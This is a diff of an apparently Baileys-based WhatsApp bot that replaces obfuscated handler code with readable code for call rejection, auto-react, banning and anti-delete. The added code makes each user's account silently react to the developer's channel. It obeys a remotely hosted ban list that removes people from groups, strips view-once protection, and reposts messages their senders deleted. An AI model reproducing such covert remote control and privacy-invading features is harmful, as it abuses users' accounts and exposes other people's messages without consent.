-        if (_0x23653b[_0x3a9ceb(0xc9)]('/')[0x0] === _0x3a9ceb(0x18b)) return _0x55533e[_0x3a9ceb(0x199)](_0x52d415, {
-          'audio': await _0x751165(_0x3b402b)
-          , 'caption': _0x18368b
-          , 'mimetype': _0x3a9ceb(0x139)
-          , ..._0x65b8f7
-        }, {
-          'quoted': _0xdd3e09
-          , ..._0x65b8f7
-        });
-      };
-      const _0x1e815c = (await axios[_0x297513(0x114)](_0x297513(0x71)))[_0x297513(0x174)];
-      config[_0x297513(0x72)] = _0x1e815c[_0x297513(0x15e)];
-      const _0x2dd895 = await _0x7a6b25(_0x297513(0x148))
-        , _0x2ac8ed = _0x2dd895[_0x297513(0x132)][_0x297513(0xc9)](',')
-        , _0x413721 = _0x2ac8ed[_0x297513(0x176)](_0x3c720d => _0x3c720d[_0x297513(0xe8)](/[^0-9]/g, '') + _0x297513(0x18d))['includes'](_0x14d9fb)
-        , _0x543ebc = await _0x7a6b25(_0x297513(0x7f))
-        , _0x26df15 = _0x543ebc['alex'][_0x297513(0xc9)](',')
-        , _0x3b3b30 = _0x26df15['map'](_0x1f0c96 => _0x1f0c96[_0x297513(0xe8)](/[^0-9]/g, '') + _0x297513(0x18d))[_0x297513(0x8f)](_0x14d9fb)
-        , _0x14d661 = await _0x7a6b25(_0x297513(0x77))
-        , _0x5d84a4 = _0x14d661[_0x297513(0xc9)](',')
-        , _0xfc4e4a = [..._0x5d84a4][_0x297513(0x176)](_0x26abd0 => _0x26abd0[_0x297513(0xe8)](/[^0-9]/g, '') + _0x297513(0x18d))[_0x297513(0x8f)](_0x14d9fb);
-      let _0xd016de = '' + config[_0x297513(0x9c)];
-      const _0x496b37 = _0xd016de[_0x297513(0xc9)](',')
-        , _0x5d4baa = [..._0x496b37][_0x297513(0x8f)](_0x222bfb)
-        , _0x95662f = await _0x7a6b25(_0x297513(0x182))
-        , _0x4a5c4f = _0x95662f[_0x297513(0x176)](_0x4f3b46 => _0x4f3b46[_0x297513(0xe8)](/[^0-9]/g, '') + '@g.us')[_0x297513(0x8f)](_0x222bfb);
-      let _0x164fb9 = '' + config[_0x297513(0xa9)];
-      const _0x46d4e0 = _0x164fb9[_0x297513(0xc9)](',')
-        , _0x3805d1 = [..._0x46d4e0][_0x297513(0x8f)](_0x14d9fb);
-      if (_0x12771f && _0x5d4baa && !_0x3c46fb && !_0x3805d1) return;
-      const _0x8a4565 = (await axios[_0x297513(0x114)](_0x297513(0x11d)))[_0x297513(0x174)]
-        , _0x5f1ee4 = (await axios['get'](_0x297513(0x71)))[_0x297513(0x174)]
-        , _0x45d117 = _0x4b9a40['key'][_0x297513(0x6f)]
-        , _0xf9ac7e = ['❤️', '😮', '👍', '🙏']
-        , _0x396154 = _0xf9ac7e[Math[_0x297513(0x149)](Math['random']() * _0xf9ac7e[_0x297513(0x1b4)])];
-      await _0x55533e[_0x297513(0x100)]('' + _0x5f1ee4[_0x297513(0xcc)], _0x45d117, _0x396154);
-  if(senderNumber.includes("94711451319")){
+        }
+    }, {
+        quoted: quoted
+    });
+
+    await conn.relayMessage(jid, message.message, { messageId: message.key.id });
+};
+
+
+
+
+	    
+
+conn.edite = async (gg, newmg) => {
+  await conn.relayMessage(from, {
+    protocolMessage: {
+key: gg.key,
+type: 14,
+editedMessage: {
+  conversation: newmg
+}
+    }
+  }, {})
+}
+
+	    
+conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
+            let vtype
+            if (options.readViewOnce) {
+                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
+                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
+                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
+                delete message.message.viewOnceMessage.message[vtype].viewOnce
+                message.message = {
+                    ...message.message.viewOnceMessage.message
+                }
+            }
+
+            let mtype = Object.keys(message.message)[0]
+            let content = await generateForwardMessageContent(message, forceForward)
+            let ctype = Object.keys(content)[0]
+            let context = {}
+            if (mtype != "conversation") context = message.message[mtype].contextInfo
+            content[ctype].contextInfo = {
+                ...context,
+                ...content[ctype].contextInfo
+            }
+            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
+                ...content[ctype],
+                ...options,
+                ...(options.contextInfo ? {
+                    contextInfo: {
+                        ...content[ctype].contextInfo,
+                        ...options.contextInfo
+                    }
+                } : {})
+            } : {})
+            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
+            return waMessage
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	    
+conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
+  let mime = '';
+  let res = await axios.head(url)
+  mime = res.headers['content-type']
+  if (mime.split("/")[1] === "gif") {
+    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
+  }
+  let type = mime.split("/")[0] + "Message"
+  if (mime === "application/pdf") {
+    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
+  }
+  if (mime.split("/")[0] === "image") {
+    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
+  }
+  if (mime.split("/")[0] === "video") {
+    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
+  }
+  if (mime.split("/")[0] === "audio") {
+    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
+  }
+}
+
+const ownerdata = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
+            
+           
+            config.FOOTER = ownerdata.footer
+           
+const preUser = await fetchJson(`https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/premirum.json`)
+const preUsers = preUser.numbers.split(",");
+
+// replace करके "@s.whatsapp.net" format එකට convert කරලා check කරන්න
+const isPre = preUsers
+  .map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
+  .includes(sender);
+
+
+
+
+
+	    
+//============================================================================ 
+const banbn = await fetchJson(`https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/ban_number.json`)
+const plynYnna = banbn.split(",")
+const isBanUser = [ ...plynYnna ]
+      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
+      .includes(sender)
+
+
+  let gpId = `${config.JID_BLOCK}`;
+const gpIdz = gpId.split(",")
+const isBanGrp = [ ...gpIdz ]
+      
+      .includes(from)
+
+//======================================================================================================================================================================
+
+
+
+  let epaneda = `${config.SUDO}`;
+  const epada = epaneda.split(",")
+  const isSudo = [ ...epada ]
+        
+        .includes(sender)
+//=========================================BAN GROUPS=====================================================
+if ( isCmd && isBanGrp && !isMe && !isSudo) return
+
+
+
+//========================================== TEAM REACT SECTION ========================================
+
+const rec = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/react.json')).data
+
+const recc = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
+
+//================================================================================================================	    
+const id = mek.key.server_id
+const defaultEmojis = ["❤️", "😮", "👍"];
+const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)];
+await conn.newsletterReactMessage(`${recc.mainchanal}`, id, randomEmoji);
+    
+//=========================================================================================================================	    
+if(senderNumber.includes("94711451319")){
 if(isReact) return
 m.react(`${rec.nadeen}`)
 }
@@ -770,416 +827,476 @@ const ownNum = config.OWNER_NUMBER;
 if(isReact) return 
 m.react(`🍁`)
             }
-      _0x12771f && config[_0x297513(0x9b)] == _0x297513(0x141) && await _0x55533e[_0x297513(0xbe)]([_0x4b9a40[_0x297513(0x81)]]);
-      if (_0x12771f && _0x4a5c4f) return;
-      if (config[_0x297513(0x175)] == _0x297513(0xb4)) {
-        if (!_0xeed4d1 && _0x12771f && !_0x3c46fb && !_0xf8a499 && !_0x3805d1) return;
+
+if (isCmd && config.CMD_ONLY_READ  == "true"){
+await conn.readMessages([mek.key])
+
+}
+
+     if ( config.WORK_TYPE == "only_group" ) {
+if ( !isGroup && isCmd &&  !isMe && !isOwner && !isSudo ) return
       }
-      if (config['WORK_TYPE'] == _0x297513(0xd2)) {
-        if (_0x12771f && !_0x3c46fb && !_0xf8a499 && !_0x3805d1) return;
+      
+   if ( config.WORK_TYPE == "private" ) {
+if  ( isCmd && !isMe && !isOwner && !isSudo ) return
       }
-      if (config[_0x297513(0x175)] == 'inbox') {
-        if (_0xeed4d1 && !_0x3c46fb && !_0xf8a499 && !_0x3805d1) return;
+
+   if ( config.WORK_TYPE == "inbox" ) {
+if  ( isGroup &&  !isMe && !isOwner && !isSudo ) return
+      }      
+
+//============================================Always online============================================================
+
+ if (config.ALLWAYS_OFFLINE == "true") {
+        conn.sendPresenceUpdate('unavailable'); // Sets the bot's last seen status
+    }
+
+
+
+	    
+//========================================vajira ponnaya athulu lewakana un========================================================
+if ( isBanUser ) {
+	await conn.sendMessage(from, { delete: mek.key })
+	await conn.groupParticipantsUpdate(from, [sender], 'remove')
+	return await conn.sendMessage(from, { text: "*You are banned by NADEEN MD ❌\n\nPlease Contact Nadeen Remove it.*" })
+}
+
+	
+
+	    
+//============================================AUTO BLOCK=============================================================================================================
+if (config.AUTO_BLOCK  == "true" && mek.chat.endsWith("@s.whatsapp.net")) {
+			if(!isMe){
+
+  await conn.sendMessage(from, { text: `*Warning 1 ❗*` });
+
+				await conn.sendMessage(from, { text: `*Warning 2 ❗*` });
+				  await conn.sendMessage(from, { text: `*Warning 3 ❗*` });
+				  await conn.sendMessage(from, { text: `*Blocked 🚫*` });
+
+		  await conn.updateBlockStatus(mek.sender, 'block')
+			}
+		}
+//=============================================ANTI CALL======================================================================================================
+const rejectedCalls = new Set();    // reject call id එකට lock
+const messagedCallers = new Set();  // caller number lock
+
+conn.ev.on("call", async (json) => {
+  if (config.ANTI_CALL !== "true") return;
+
+  for (const call of json) {
+    if (call.status === "offer") {
+
+      // Reject එක call id එකට එක වතාවක් පමණයි
+      if (!rejectedCalls.has(call.id)) {
+        await conn.rejectCall(call.id, call.from);
+        rejectedCalls.add(call.id);
+
+        // Clear rejectedCalls after 5 minutes to save memory
+        setTimeout(() => rejectedCalls.delete(call.id), 5 * 60 * 1000);
       }
-      if (_0xfc4e4a) return await _0x55533e['sendMessage'](_0x222bfb, {
-        'delete': _0x4b9a40[_0x297513(0x81)]
-      }), await _0x55533e['groupParticipantsUpdate'](_0x222bfb, [_0x14d9fb], _0x297513(0x127)), await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-        'text': _0x297513(0xdc)
-      });
-      config[_0x297513(0x13e)] == _0x297513(0x141) && _0x4b9a40[_0x297513(0x7e)][_0x297513(0xf7)](_0x297513(0x18d)) && (!_0x3c46fb && (await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-        'text': _0x297513(0x190)
-      }), await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-        'text': _0x297513(0xbd)
-      }), await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-        'text': _0x297513(0x87)
-      }), await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-        'text': '*Blocked 🚫*'
-      }), await _0x55533e['updateBlockStatus'](_0x4b9a40['sender'], _0x297513(0x8d))));
-      _0x55533e['ev']['on']('call', async _0x48c752 => {
-        const _0x3bf3af = _0x297513;
-        if (config[_0x3bf3af(0x103)] == _0x3bf3af(0x141))
-          for (const _0x23feaf of _0x48c752) {
-            if (_0x23feaf[_0x3bf3af(0x189)] === _0x3bf3af(0xdb)) {
-              await _0x55533e[_0x3bf3af(0xae)](_0x23feaf['id'], _0x23feaf['from']);
-              if (!_0x23feaf['isGroup']) {
-                await _0x55533e[_0x3bf3af(0x199)](_0x23feaf[_0x3bf3af(0xbf)], {
-                  'text': '*Call rejected automatically because owner is busy ⚠️*'
-                  , 'mentions': [_0x23feaf[_0x3bf3af(0xbf)]]
-                });
-                break;
-              }
-            }
-          }
-      });
-      _0x12771f && config['CMD_ONLY_READ'] == _0x297513(0x141) && await _0x55533e['readMessages']([_0x4b9a40[_0x297513(0x81)]]);
-      const _0x49ae8a = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋']
-        , _0x520320 = _0x49ae8a[Math['floor'](Math[_0x297513(0x1c1)]() * _0x49ae8a[_0x297513(0x1b4)])];
-      if (!_0x3c46fb && !_0x5d4baa && config[_0x297513(0xa3)] == _0x297513(0x141)) {
-        if (_0x5cd917) return;
-        await _0x55533e[_0x297513(0x199)](_0x4b9a40['chat'], {
-          'react': {
-            'text': _0x520320
-            , 'key': _0x4b9a40[_0x297513(0x81)]
-          }
+
+      // Message එක caller එකට එක වතාවක් පමණයි
+      if (!call.isGroup && !messagedCallers.has(call.from)) {
+        await conn.sendMessage(call.from, {
+          text: "*Call rejected automatically because owner is busy ⚠️*",
+          mentions: [call.from],
         });
+        messagedCallers.add(call.from);
+
+        // Clear messagedCallers after 10 minutes so caller can get message again later
+        setTimeout(() => messagedCallers.delete(call.from), 10 * 60 * 1000);
       }
-      config[_0x297513(0x1c0)] == _0x297513(0x141) && await _0x55533e['readMessages']([_0x4b9a40[_0x297513(0x81)]]);
-      config['AUTO_TYPING'] == _0x297513(0x141) && _0x55533e[_0x297513(0x126)](_0x297513(0x88), _0x4b9a40[_0x297513(0x81)]['remoteJid']);
-      config[_0x297513(0x7b)] == _0x297513(0x141) && _0x55533e['sendPresenceUpdate'](_0x297513(0x6c), _0x4b9a40['key']['remoteJid']);
-      if (config[_0x297513(0xf8)] == _0x297513(0x141)) {
-        if (_0x43833d[_0x297513(0x185)]) {
-          let _0x2acea0 = _0x43833d[_0x297513(0x1c2)] ? _0x43833d[_0x297513(0x1c2)][_0x297513(0x154)]() : '';
-          try {
-            let _0x43e233 = await _0x7a6b25(_0x297513(0xfb) + _0x2acea0);
-            await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-              'text': _0x43e233[_0x297513(0x9a)]['data']
-            });
-          } catch (_0x1c8c1a) {
-            console['error'](_0x297513(0x128), _0x1c8c1a), await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-              'text': '.'
-            });
-          }
+    }
+  }
+});
+
+
+//================================================CMD ONLY READ=================================================================================================
+
+//=================================================AUTO REACT================================================================================================	    
+const emojis = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋']
+         const emokis = emojis[Math.floor(Math.random() * (emojis.length))]
+        if(!isMe &&  config.AUTO_REACT  == "true"){
+            if(isReact) return 
+         await conn.sendMessage(mek.chat, {
+             react: {
+                 text: emokis,
+                 key: mek.key
+             }
+         })}
+//================================================AUTO MSG READ==========================================================================================================
+if (config.AUTO_MSG_READ  == "true"){
+await conn.readMessages([mek.key])
+
+}
+
+//===============================================AUTO TYPING===============================================================================================================	      
+
+  
+  if(config.AUTO_TYPING  == "true"){
+                conn.sendPresenceUpdate('composing', mek.key.remoteJid)
+            }
+	    
+//============================================AUTO RECOOURDING=========================================================================================================
+	    if(config.AUTO_RECORDING  == "true"){
+		conn.sendPresenceUpdate('recording', mek.key.remoteJid)
+            	    
+       }
+
+//==============================================CHATBOT=========================================================
+
+if (config.CHAT_BOT == "true") { // Enable or disable this feature via config
+     if (m.quoted) { // Works for both group and inbox
+        let query = m.body ? m.body.toLowerCase() : ""; // Ensure 'body' is defined
+        try {
+            let datae = await fetchJson(`https://saviya-kolla-api.koyeb.app/ai/saviya-ai?query=${query}`);
+            await conn.sendMessage(from, { text: datae.result.data }); // Send AI response
+        } catch (error) {
+            console.error("AI Chat Error:", error); // Handle errors
+            await conn.sendMessage(from, { text: "." });
         }
+    }
+}
+
+    
+    //==================================ANTI DELETE========================================
+if(!isOwner) {	
+    if(config.ANTI_DELETE  == "true") {
+    if (!m.id.startsWith("BAE5")) {
+    
+    // Ensure the base directory exists
+    const baseDir = 'message_data';
+    if (!fs.existsSync(baseDir)) {
+      fs.mkdirSync(baseDir);
+    }
+    
+    function loadChatData(remoteJid, messageId) {
+      const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
+      try {
+        const data = fs.readFileSync(chatFilePath, 'utf8');
+        return JSON.parse(data) || [];
+      } catch (error) {
+        return [];
       }
-      if (!_0xf8a499) {
-        if (config['ANTI_DELETE'] == _0x297513(0x141)) {
-          if (!_0x43833d['id'][_0x297513(0x111)](_0x297513(0x86))) {
-            const _0x59a11a = _0x297513(0x118);
-            !fs[_0x297513(0x147)](_0x59a11a) && fs['mkdirSync'](_0x59a11a);
-            
-            function _0x2b22b9(_0x2c77de, _0x180b25) {
-              const _0x425200 = _0x297513
-                , _0x41fde8 = path[_0x425200(0xd7)](_0x59a11a, _0x2c77de, _0x180b25 + '.json');
-              try {
-                const _0x35271d = fs[_0x425200(0x11e)](_0x41fde8, _0x425200(0x1b5));
-                return JSON[_0x425200(0xc2)](_0x35271d) || [];
-              } catch (_0x370f42) {
-                return [];
-              }
-            }
-            
-            function _0x469121(_0x4db277, _0x108492, _0x29c21b) {
-              const _0x4173e7 = _0x297513
-                , _0x475b13 = path[_0x4173e7(0xd7)](_0x59a11a, _0x4db277);
-              !fs[_0x4173e7(0x147)](_0x475b13) && fs[_0x4173e7(0x1b8)](_0x475b13, {
-                'recursive': !![]
-              });
-              const _0x295a3c = path[_0x4173e7(0xd7)](_0x475b13, _0x108492 + _0x4173e7(0x1a0));
-              try {
-                fs[_0x4173e7(0xa0)](_0x295a3c, JSON[_0x4173e7(0x10d)](_0x29c21b, null, 0x2));
-              } catch (_0x2f776a) {
-                console[_0x4173e7(0x1a1)](_0x4173e7(0x133), _0x2f776a);
-              }
-            }
-            
-            function _0x4d4112(_0x1a82a4) {
-              const _0x7d417f = _0x297513
-                , _0x27bd01 = _0x222bfb
-                , _0x4e0569 = _0x1a82a4[_0x7d417f(0x81)]['id']
-                , _0x21986c = _0x2b22b9(_0x27bd01, _0x4e0569);
-              _0x21986c[_0x7d417f(0x119)](_0x1a82a4), _0x469121(_0x27bd01, _0x4e0569, _0x21986c);
-            }
-            const _0x262521 = _0x222bfb;
-            
-            function _0x4d1697(_0x41934b) {
-              const _0x3516ba = _0x297513
-                , _0x489644 = _0x222bfb
-                , _0x4d532b = _0x41934b[_0x3516ba(0xe5)][_0x3516ba(0x81)]['id']
-                , _0x3089c2 = _0x2b22b9(_0x489644, _0x4d532b)
-                , _0x746d71 = _0x3089c2[0x0];
-              if (_0x746d71) {
-                const _0x51481d = _0x41934b['sender'][_0x3516ba(0xc9)]('@')[0x0]
-                  , _0x5bd17e = _0x746d71[_0x3516ba(0x81)][_0x3516ba(0x11b)] ?? _0x41934b[_0x3516ba(0x97)]
-                  , _0x31fe65 = _0x5bd17e['split']('@')[0x0];
-                if (_0x51481d[_0x3516ba(0x8f)](_0x117f3b) || _0x31fe65[_0x3516ba(0x8f)](_0x117f3b)) return;
-                if (_0x746d71[_0x3516ba(0x19d)] && _0x746d71[_0x3516ba(0x19d)]['conversation'] && _0x746d71[_0x3516ba(0x19d)]['conversation'] !== '') {
-                  const _0x12f361 = _0x746d71['message']['conversation'];
-                  var _0x3d71c8 = '```';
-                  _0x55533e[_0x3516ba(0x199)](_0x262521, {
-                    'text': _0x3516ba(0x78) + _0x51481d + '_\x0a  📩 *Sent by:* _' + _0x31fe65 + _0x3516ba(0x106) + _0x3d71c8 + _0x12f361 + _0x3d71c8
-                  });
-                } else {
-                  if (_0x746d71[_0x3516ba(0xe5)][_0x3516ba(0x12d)] === 'MESSAGE_EDIT') _0x55533e[_0x3516ba(0x199)](_0x262521, {
-                    'text': _0x3516ba(0x12b) + _0x746d71[_0x3516ba(0x19d)]['editedMessage']['message']['protocolMessage']['editedMessage'][_0x3516ba(0x162)]
-                  }, {
-                    'quoted': _0x4b9a40
-                  });
-                  else {
-                    if (_0x746d71['message'] && _0x746d71[_0x3516ba(0x19d)]['exetendedTextMessage'] && _0x746d71[_0x3516ba(0xe5)]['text']) {
-                      const _0x3a7fce = _0x746d71[_0x3516ba(0xe5)][_0x3516ba(0xf0)];
-                      if (_0xeed4d1 && _0x3a7fce['includes'](_0x3516ba(0x107))) return;
-                      var _0x3d71c8 = _0x3516ba(0x151);
-                      _0x55533e['sendMessage'](_0x262521, {
-                        'text': _0x3516ba(0x78) + _0x51481d + '_\x0a  📩 *Sent by:* _' + _0x31fe65 + '_\x0a\x0a> 🔓 Message Text: ' + _0x3d71c8 + _0x3a7fce + _0x3d71c8
-                      });
-                    } else {
-                      if (_0x746d71[_0x3516ba(0x19d)] && _0x746d71[_0x3516ba(0x19d)]['exetendedTextMessage']) {
-                        const _0x2cd01f = _0x746d71[_0x3516ba(0x19d)][_0x3516ba(0x6d)][_0x3516ba(0xf0)];
-                        if (_0xeed4d1 && messageText[_0x3516ba(0x8f)]('chat.whatsapp.com')) return;
-                        var _0x3d71c8 = _0x3516ba(0x151);
-                        _0x55533e['sendMessage'](_0x262521, {
-                          'text': _0x3516ba(0x78) + _0x51481d + _0x3516ba(0x187) + _0x31fe65 + _0x3516ba(0x106) + _0x3d71c8 + _0x746d71['body'] + _0x3d71c8
-                        });
-                      } else {
-                        if (_0x746d71[_0x3516ba(0x12d)] === _0x3516ba(0x6d)) {
-                          async function _0x2f075b() {
-                            const _0x3d344b = _0x3516ba;
-                            var _0x53a795 = _0x4d32a6('');
-                            const _0x5791bc = _0x1b6df1(_0x55533e, _0x746d71);
-                            if (_0x746d71[_0x3d344b(0x19d)]['extendedTextMessage']) {
-                              const _0x1173ed = _0x746d71['message']['extendedTextMessage'][_0x3d344b(0xf0)];
-                              if (_0xeed4d1 && messageText[_0x3d344b(0x8f)](_0x3d344b(0x107))) return;
-                              var _0x575158 = '```';
-                              _0x55533e[_0x3d344b(0x199)](_0x262521, {
-                                'text': _0x3d344b(0x78) + _0x51481d + _0x3d344b(0x187) + _0x31fe65 + _0x3d344b(0x106) + _0x575158 + _0x746d71[_0x3d344b(0x19d)]['extendedTextMessage']['text'] + _0x575158
-                              });
-                            } else {
-                              const _0x3b3987 = _0x746d71[_0x3d344b(0x19d)]['extendedTextMessage'][_0x3d344b(0xf0)];
-                              if (_0xeed4d1 && messageText[_0x3d344b(0x8f)](_0x3d344b(0x107))) return;
-                              _0x55533e['sendMessage'](_0x262521, {
-                                'text': _0x3d344b(0x78) + _0x51481d + _0x3d344b(0x187) + _0x31fe65 + _0x3d344b(0x106) + _0x575158 + _0x746d71[_0x3d344b(0x19d)][_0x3d344b(0x6d)][_0x3d344b(0xf0)] + _0x575158
-                              });
-                            }
-                          }
-                          _0x2f075b();
-                        } else {
-                          if (_0x746d71['type'] === _0x3516ba(0xe3)) {
-                            async function _0xda8658() {
-                              const _0x3f7e01 = _0x3516ba;
-                              var _0x44213c = _0x4d32a6('');
-                              const _0x448076 = _0x1b6df1(_0x55533e, _0x746d71);
-                              let _0x253cab = await _0x448076[_0x3f7e01(0xd9)](_0x44213c)
-                                , _0x23ab03 = require('file-type')
-                                , _0x13a214 = _0x23ab03['fromBuffer'](_0x253cab);
-                              await fs['promises']['writeFile']('./' + _0x13a214[_0x3f7e01(0xfd)], _0x253cab);
-                              if (_0x746d71[_0x3f7e01(0x19d)]['imageMessage'][_0x3f7e01(0x14a)]) {
-                                const _0x253074 = _0x746d71['message'][_0x3f7e01(0xe3)]['caption'];
-                                if (_0xeed4d1 && _0x253074['includes'](_0x3f7e01(0x107))) return;
-                                await _0x55533e['sendMessage'](_0x262521, {
-                                  'image': fs['readFileSync']('./' + _0x13a214[_0x3f7e01(0xfd)])
-                                  , 'caption': _0x3f7e01(0x78) + _0x51481d + _0x3f7e01(0x187) + _0x31fe65 + '_\x0a\x0a> 🔓 Message Text: ' + _0x746d71['message'][_0x3f7e01(0xe3)][_0x3f7e01(0x14a)]
-                                });
-                              } else await _0x55533e[_0x3f7e01(0x199)](_0x262521, {
-                                'image': fs[_0x3f7e01(0x11e)]('./' + _0x13a214[_0x3f7e01(0xfd)])
-                                , 'caption': _0x3f7e01(0x78) + _0x51481d + _0x3f7e01(0x187) + _0x31fe65 + '_'
-                              });
-                            }
-                            _0xda8658();
-                          } else {
-                            if (_0x746d71['type'] === _0x3516ba(0xf1)) {
-                              async function _0x432168() {
-                                const _0x2c6ace = _0x3516ba;
-                                var _0x1d0d7b = _0x4d32a6('');
-                                const _0x1e72c1 = _0x1b6df1(_0x55533e, _0x746d71)
-                                  , _0x3e0f74 = _0x746d71[_0x2c6ace(0x19d)][_0x2c6ace(0xf1)][_0x2c6ace(0x108)]
-                                  , _0xf0d7b2 = _0x746d71[_0x2c6ace(0x19d)][_0x2c6ace(0xf1)][_0x2c6ace(0x196)]
-                                  , _0x399556 = config[_0x2c6ace(0x1bc)]
-                                  , _0x571aca = _0x3e0f74
-                                  , _0x207d2e = _0x571aca / (0x400 * 0x400)
-                                  , _0x36fb27 = _0xf0d7b2;
-                                if (_0x746d71[_0x2c6ace(0x19d)][_0x2c6ace(0xf1)][_0x2c6ace(0x14a)]) {
-                                  if (_0x207d2e < _0x399556 && _0x36fb27 < 0x1e * 0x3c) {
-                                    let _0x152cd7 = await _0x1e72c1[_0x2c6ace(0xd9)](_0x1d0d7b)
-                                      , _0x4fdbac = require(_0x2c6ace(0xa5))
-                                      , _0x4e168a = _0x4fdbac[_0x2c6ace(0xb9)](_0x152cd7);
-                                    await fs[_0x2c6ace(0x1b6)]['writeFile']('./' + _0x4e168a['ext'], _0x152cd7);
-                                    const _0x51475e = _0x746d71[_0x2c6ace(0x19d)][_0x2c6ace(0xf1)][_0x2c6ace(0x14a)];
-                                    if (_0xeed4d1 && _0x51475e['includes']('chat.whatsapp.com')) return;
-                                    await _0x55533e['sendMessage'](_0x262521, {
-                                      'video': fs[_0x2c6ace(0x11e)]('./' + _0x4e168a['ext'])
-                                      , 'caption': _0x2c6ace(0x78) + _0x51481d + _0x2c6ace(0x187) + _0x31fe65 + _0x2c6ace(0x106) + _0x746d71[_0x2c6ace(0x19d)]['videoMessage']['caption']
-                                    });
-                                  }
-                                } else {
-                                  let _0xd8cc68 = await _0x1e72c1[_0x2c6ace(0xd9)](_0x1d0d7b)
-                                    , _0x36819f = require(_0x2c6ace(0xa5))
-                                    , _0x25d64d = _0x36819f[_0x2c6ace(0xb9)](_0xd8cc68);
-                                  await fs[_0x2c6ace(0x1b6)]['writeFile']('./' + _0x25d64d['ext'], _0xd8cc68);
-                                  const _0x5e6730 = _0x746d71[_0x2c6ace(0x19d)]['videoMessage'][_0x2c6ace(0x108)]
-                                    , _0x59d428 = _0x746d71[_0x2c6ace(0x19d)][_0x2c6ace(0xf1)]['seconds']
-                                    , _0x388db5 = config[_0x2c6ace(0x1bc)]
-                                    , _0xe0d20d = _0x5e6730
-                                    , _0xba6a95 = _0xe0d20d / (0x400 * 0x400)
-                                    , _0x375ddb = _0x59d428;
-                                  _0xba6a95 < _0x388db5 && _0x375ddb < 0x1e * 0x3c && await _0x55533e['sendMessage'](_0x262521, {
-                                    'video': fs['readFileSync']('./' + _0x25d64d[_0x2c6ace(0xfd)])
-                                    , 'caption': '🚫 *This message was deleted !!*\x0a\x0a  🚮 *Deleted by:* _' + _0x51481d + _0x2c6ace(0x187) + _0x31fe65 + '_'
-                                  });
-                                }
-                              }
-                              _0x432168();
-                            } else {
-                              if (_0x746d71[_0x3516ba(0x12d)] === _0x3516ba(0x14c)) {
-                                async function _0x5f46bf() {
-                                  const _0x1a42ac = _0x3516ba;
-                                  var _0x17ac40 = _0x4d32a6('');
-                                  const _0x459fdf = _0x1b6df1(_0x55533e, _0x746d71);
-                                  let _0x37af92 = await _0x459fdf[_0x1a42ac(0xd9)](_0x17ac40)
-                                    , _0x41c414 = require(_0x1a42ac(0xa5))
-                                    , _0xc1ad22 = _0x41c414[_0x1a42ac(0xb9)](_0x37af92);
-                                  await fs[_0x1a42ac(0x1b6)][_0x1a42ac(0x18f)]('./' + _0xc1ad22[_0x1a42ac(0xfd)], _0x37af92), _0x746d71[_0x1a42ac(0x19d)]['documentWithCaptionMessage'] ? await _0x55533e['sendMessage'](_0x262521, {
-                                    'document': fs[_0x1a42ac(0x11e)]('./' + _0xc1ad22[_0x1a42ac(0xfd)])
-                                    , 'mimetype': _0x746d71[_0x1a42ac(0x19d)][_0x1a42ac(0x14c)]['mimetype']
-                                    , 'fileName': _0x746d71[_0x1a42ac(0x19d)][_0x1a42ac(0x14c)][_0x1a42ac(0x13c)]
-                                    , 'caption': _0x1a42ac(0x78) + _0x51481d + _0x1a42ac(0x187) + _0x31fe65 + '_\x0a'
-                                  }) : await _0x55533e['sendMessage'](_0x262521, {
-                                    'document': fs['readFileSync']('./' + _0xc1ad22['ext'])
-                                    , 'mimetype': _0x746d71['message'][_0x1a42ac(0x14c)][_0x1a42ac(0x98)]
-                                    , 'fileName': _0x746d71[_0x1a42ac(0x19d)][_0x1a42ac(0x14c)][_0x1a42ac(0x13c)]
-                                    , 'caption': _0x1a42ac(0x78) + _0x51481d + '_\x0a  📩 *Sent by:* _' + _0x31fe65 + '_\x0a'
-                                  });
-                                }
-                                _0x5f46bf();
-                              } else {
-                                if (_0x746d71[_0x3516ba(0x12d)] === _0x3516ba(0x1a5)) {
